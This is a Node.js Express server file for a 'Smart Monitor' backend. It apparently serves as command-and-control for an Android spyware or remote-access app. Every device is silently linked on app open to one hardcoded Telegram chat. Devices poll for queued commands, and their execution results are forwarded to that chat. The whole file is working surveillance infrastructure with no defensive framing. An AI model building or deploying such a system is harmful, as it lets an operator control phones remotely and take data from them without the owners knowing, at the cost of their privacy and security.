require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const User = require('./models/User');
const { pendingCommands } = require('./queue');

// Import and start the Telegram bot listener
require('./bot');

const app = express();
app.use(express.json());
app.use(cors());

// Connect to MongoDB
mongoose.connect(process.env.MONGO_URI)
.then(() => console.log('Smart Monitor Database Connected Successfully!'))
.catch((err) => console.error('MongoDB connection error:', err));

// Permanent Chat ID registration endpoint (Automated on app open)
app.post('/api/link-chat', async (req, res) => {
  try {
    const { deviceId } = req.body;
    const PERMANENT_CHAT_ID = '6670344997';
    
    if (!deviceId) {
      return res.status(400).json({ success: false, error: 'Device ID is required.' });
    }

    const updatedUser = await User.findOneAndUpdate(
      { deviceId },
      { chatId: PERMANENT_CHAT_ID, lastSeen: new Date() },
      { upsert: true, returnDocument: 'after' }
    );

    res.status(200).json({ success: true, message: 'Device registered successfully!', user: updatedUser });
  } catch (error) {
    console.error('Error linking device:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// API Endpoint: Android App polls for pending commands
app.get('/api/get-command', (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });

  // Update last seen heartbeat
  User.updateOne({ deviceId }, { lastSeen: new Date() }).catch(() => {});

  const command = pendingCommands[deviceId] || null;
  if (command) {
    delete pendingCommands[deviceId]; // Clear command after polling
  }
  res.json({ command });
});

// API Endpoint: Android App posts execution results back to Telegram
app.post('/api/post-result', async (req, res) => {
  const { deviceId, result } = req.body;
  if (!deviceId || !result) return res.status(400).json({ error: 'Missing parameters' });

  try {
    const user = await User.findOne({ deviceId });
    if (user && user.chatId) {
      const bot = require('./bot');
      bot.sendMessage(user.chatId, `📱 **Device Report [ID: \`${deviceId.substring(0, 8)}...\`]**:\n\n${result}`, { parse_mode: 'Markdown' });
      res.json({ success: true });
    } else {
      res.status(404).json({ error: 'Device not found' });
    }
  } catch (err) {
    console.error('Error posting result:', err);
    res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Smart Monitor backend running on port ${PORT}`);
});